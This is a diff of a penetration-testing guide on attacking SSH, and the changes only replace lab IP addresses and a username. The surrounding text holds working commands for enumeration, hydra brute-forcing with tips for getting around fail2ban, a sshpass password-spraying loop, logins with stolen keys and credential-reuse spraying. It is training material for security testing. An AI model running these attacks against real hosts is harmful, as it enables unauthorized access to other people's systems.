@@ -126,11 +126,11 @@ The single highest-impact misconfig: `PasswordAuthentication yes` on an internet
 ### Banner grab
 
 ```shell
-nc -nv 10.129.14.128 22
+nc -nv 10.0.14.128 22
 ```
 
 ```
-(UNKNOWN) [10.129.14.128] 22 (ssh) open
+(UNKNOWN) [10.0.14.128] 22 (ssh) open
 SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
 ```
 
@@ -145,7 +145,7 @@ That distro hint is valuable: Ubuntu's patch identifier maps to a specific Ubunt
 ### Service scan
 
 ```shell
-sudo nmap 10.129.14.128 -sV -sC -p22
+sudo nmap 10.0.14.128 -sV -sC -p22
 ```
 
 ```
@@ -167,7 +167,7 @@ The host-key fingerprints help with two things:
 [ssh-audit](https://github.com/jtesta/ssh-audit) is the comprehensive analyzer:
 
 ```shell
-ssh-audit 10.129.14.128
+ssh-audit 10.0.14.128
 ```
 
 ```
@@ -220,13 +220,13 @@ Flagged `fail` items aren't immediately exploitable but indicate a configuration
 
 ```shell
 ssh -v -o PreferredAuthentications=none -o StrictHostKeyChecking=no \
-    user@10.129.14.128
+    user@10.0.14.128
 ```
 
 ```
 debug1: Local version string SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
 debug1: Remote protocol version 2.0, remote software version OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
-debug1: Authenticating to 10.129.14.128:22 as 'user'
+debug1: Authenticating to 10.0.14.128:22 as 'user'
 debug1: kex: ...
 debug1: Authentications that can continue: publickey,password
 debug1: Next authentication method: publickey
@@ -245,7 +245,7 @@ Key data points from the verbose output:
 A faster way:
 
 ```shell
-nmap -p22 --script ssh-auth-methods --script-args="ssh.user=root" 10.129.14.128
+nmap -p22 --script ssh-auth-methods --script-args="ssh.user=root" 10.0.14.128
 ```
 
 ```
@@ -279,7 +279,7 @@ For modern OpenSSH (7.7+), these are patched. Don't rely on timing enumeration w
 ### Brute-force with rate-limiting awareness
 
 ```shell
-hydra -L users.txt -P passwords.txt -t 4 -V ssh://10.129.14.128
+hydra -L users.txt -P passwords.txt -t 4 -V ssh://10.0.14.128
 ```
 
 `-t 4` runs 4 concurrent threads. Going higher gets you blocked. Most modern Linux distros run **fail2ban** out of the box - after 5 failed attempts from one source, your IP gets blocked for 10+ minutes via iptables.
@@ -299,7 +299,7 @@ When fail2ban is in the way:
 When you want to test one cred without the noise:
 
 ```shell
-sshpass -p 'P4ssw0rd!' ssh -o StrictHostKeyChecking=no user@10.129.14.128
+sshpass -p 'P4ssw0rd!' ssh -o StrictHostKeyChecking=no user@10.0.14.128
 ```
 
 `sshpass` automates the password prompt. Combine with a small loop for spraying ONE password across many users (the inverted brute-force pattern):
@@ -309,7 +309,7 @@ for user in $(cat users.txt); do
   sshpass -p 'Spring2024!' ssh -o StrictHostKeyChecking=no \
                             -o BatchMode=no \
                             -o ConnectTimeout=4 \
-                            "$user@10.129.14.128" 'whoami' 2>&1 \
+                            "$user@10.0.14.128" 'whoami' 2>&1 \
     | grep -v "Permission denied" | head -3
 done
 ```
@@ -320,7 +320,7 @@ This pattern is much friendlier to fail2ban because each attempt is from the sam
 
 ```shell
 chmod 600 found_id_rsa
-ssh -i found_id_rsa user@10.129.14.128
+ssh -i found_id_rsa user@10.0.14.128
 ```
 
 If the key is passphrase-protected, crack the passphrase with `ssh2john` + `hashcat`:
@@ -362,7 +362,7 @@ If `AllowTcpForwarding no` is set, these don't work - `sshuttle` is the fallback
 3. `ssh -i stolen_key user@target` - instant access
 
 **SMB/SQL creds → SSH spray:**
-1. Found valid `cry0l1t3:Pass123` via SMB
+1. Found valid `jdoe:Pass123` via SMB
 2. Spray that pair across SSH targets in the same network
 3. Password reuse is endemic; one finding often opens many doors
 
